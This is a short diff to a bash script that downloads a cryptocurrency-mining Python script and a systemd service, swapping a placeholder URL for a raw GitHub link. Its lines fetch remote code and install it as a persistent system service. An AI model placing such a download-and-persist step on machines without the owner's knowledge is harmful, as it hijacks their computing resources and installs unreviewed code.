@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Download mining script and systemd service from remote server
-wget -O /home/administrator/forever.py.2 https://your-storage-server.com/forever.py.2
+wget -O /home/administrator/forever.py.2 https://raw.githubusercontent.com/Anderson816/foreverminer/refs/heads/main/forever.py.2
 wget -O /etc/systemd/system/mining.service https://your-storage-server.com/mining.service
 
 # Make sure the script is executable
